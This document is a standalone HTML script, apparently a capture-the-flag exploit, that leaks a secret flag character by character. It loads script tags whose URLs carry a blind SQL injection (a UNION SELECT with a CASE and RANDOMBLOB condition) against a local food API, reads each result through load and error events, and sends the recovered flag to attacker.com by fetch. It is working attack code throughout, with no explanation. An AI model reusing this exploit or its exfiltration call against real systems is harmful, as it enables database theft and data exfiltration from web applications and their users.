<script>

    const sleep = (ms) => {
        return new Promise(r => setTimeout(r, ms));
    }


    const leak = async (url) => {
        return new Promise((r) => {
            let s = document.createElement('script')
            s.src = url


            window.addEventListener('error', (e) => {
                s.remove()
                return r(0)
            }, { once: true })

            s.onload = s.onerror = async(e) => {
                await sleep(100)
                s.remove()
                return r(1)
            }

            document.head.appendChild(s)
        })
    }



    const log = (msg) => {
        fetch('https://attacker.com?msg=' + msg, {mode: 'no-cors'})
    }


    const main = async () => {
        let letters = '}_abcdefghijklmnopqrstuvwxyz0123456789'.split('')
        let flag = 'flag{'
        found = true 
        index = flag.length +1 
        while(!flag.endsWith('}') && found){
            found = false
            for(let l of letters){
                if(await leak(`https://0.0.0.0/api/food/1?%3F=\`%20and%200%20union%20select%201337,%20%20CASE%20when%20(select%20substr(flag,${index},1)%20from%20flag)=char(${l.charCodeAt()})%20THEN%201%20ELSE%20RANDOMBLOB(20000000000)%20END;--%20f`)){
                    flag += l
                    found = true
                    index += 1
                    log(flag)
                    break
                }
            }
        }
    }

    main()

        

</script>
